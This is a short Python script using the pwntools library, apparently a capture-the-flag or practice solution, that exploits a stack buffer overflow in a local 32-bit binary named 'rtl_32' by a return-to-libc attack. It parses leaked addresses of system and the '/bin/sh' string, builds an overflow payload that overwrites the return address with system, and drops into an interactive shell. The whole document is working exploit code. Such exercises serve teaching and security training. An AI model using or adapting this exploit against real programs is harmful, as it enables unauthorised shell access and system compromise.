from pwn import*

p = process('./rtl_32')

p.recvuntil('system : ')
system = int(p.recv(10),16)
p.recvuntil('binsh : ')
binsh = int(p.recv(9),16)

print(hex(system))
print(hex(binsh))

payload = ''
payload += 'A'*0x6c
payload += 'B'*4
payload += p32(system)
payload += 'C'*4
payload += p32(binsh)

p.sendline(payload)

p.interactive()
